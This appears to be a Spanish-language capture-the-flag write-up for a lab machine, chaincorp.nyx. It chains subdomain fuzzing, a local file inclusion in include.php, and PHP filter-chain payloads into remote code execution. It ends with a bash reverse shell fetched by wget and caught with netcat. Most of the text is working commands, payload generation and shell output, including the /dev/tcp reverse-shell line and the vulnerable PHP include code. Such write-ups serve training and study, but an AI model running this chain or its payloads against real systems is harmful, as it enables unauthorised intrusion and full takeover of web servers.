#  - Explotación LFI → PHP Filter Chain → RCE → Reverse Shell (utils.chaincorp.nyx)

## 1. Añadir subdominio al /etc/hosts

```
10.0.8.14    chaincorp.nyx
```

## 2. Fuzzing de subdominios con WFUZZ

```
wfuzz -c --hc=404 --hl=11 \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -H "Host: FUZZ.chaincorp.nyx" \
  -u http://10.0.8.14
```

**Resultado relevante:**

```
200 → utils
```

Subdominio encontrado:

```
http://utils.chaincorp.nyx/
```

---

## 3. LFI funcional en include.php

```
http://utils.chaincorp.nyx/include.php?in=/etc/passwd
```

---

## 4. Lectura del archivo mediante php://filter

```
curl "http://utils.chaincorp.nyx/include.php?in=php://filter/convert.base64-encode/resource=include.php"
```

Código vulnerbale encontrado:

```php
<?php
  $file = $_GET["in"];
  if(isset($file)) {
    include("$file");
  }
?>
```

LFI ejecutable → apto para PHP Filter Chain.

---

## 5. Generación de payload con php_filter_chain_generator

```
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
```

Devuelve un `php://filter/...` enorme listo para la URL.

---

## 6. Crear la reverse shell a descargar en la víctima

### Archivo index.html:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.8.12/443 0>&1
```

### Servidor HTTP para servir el archivo

```
python3 -m http.server 80
```

### Descargar el archivo desde la víctima con payload

```
python3 php_filter_chain_generator.py --chain "<?php system('wget 10.0.8.12'); ?>"
```

Servidor confirma:

```
10.0.8.14 - - "GET / HTTP/1.1" 200 -
```

---

## 7. Payload final para ejecutar la reverse shell descargada

```
python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
```

*(wget suele guardar como index.html.1)*

---

## 8. Listener en mi Kali

```
nc -nlvp 443
```

---

## 9. Shell conseguida

```
connect to [10.0.8.12] from (UNKNOWN) [10.0.8.14] 51204
bash: cannot set terminal process group (445): Inappropriate ioctl for device
bash: no job control in this shell
www-data@chain:/var/www/vhost$
```

---

## Resumen final

- Subdominio “utils” descubierto por host fuzzing.  
- LFI sin sanitización.  
- Lectura del include.php → ejecución arbitraria posible.  
- PHP Filter Chain → RCE completo.  
- Descarga del payload vía wget.  
- Ejecución de reverse shell Bash → acceso como www-data.

